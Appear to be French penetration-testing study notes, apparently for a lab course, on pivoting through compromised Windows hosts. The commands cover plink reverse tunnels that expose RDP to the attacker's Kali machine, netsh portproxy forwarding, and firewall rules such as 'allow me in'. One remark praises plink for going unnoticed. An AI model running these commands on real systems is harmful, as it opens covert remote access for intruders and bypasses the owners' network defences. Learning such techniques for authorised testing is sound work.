OpenSSH client vient avec depuis version 1803 (Avril 2018 Update)
Est sur-demande depuis 1709 (Creators Update)
scp.exe,sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

# OpenSSH (ssh.exe)
Disponible?: ```where ssh```
Utiliser les mêmes commandes que dans SSH

# Plink
Populaire avec les admins, peut passer inaperçu. 
Similaire à OpenSSH, mais pas de port forwarding dynamique distant.
/usr/share/windows-resources/binaries/plink.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

notre machine linux sur port 9833 vers 3389 sur la machine windows.
Si pas de TTY

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![[Pasted image 20240118092933.png]]

# Port forward et pare-feux
## Netsh (natif)
Requière admin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Savoir si fonctionne: 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netstat -anp TCP | find "2222"
netsh interface portproxy show all
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Pour ouvrir le pare-feu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Supprime la règle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Pour supprimer le port forward
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## Powershell cmdlet
Seulement pour ouvrir le pare-feu
New-NetFirewallRule 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New-NetFirewallRule -DisplayName "allow me in" -Direction Inbound -protocol TCP -localport 2222 -EdgeTraversalPolicy Allow -Action Allow
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disable-NetFirewallRule
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disable-NetFirewallRule -DisplayName "allow me in"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
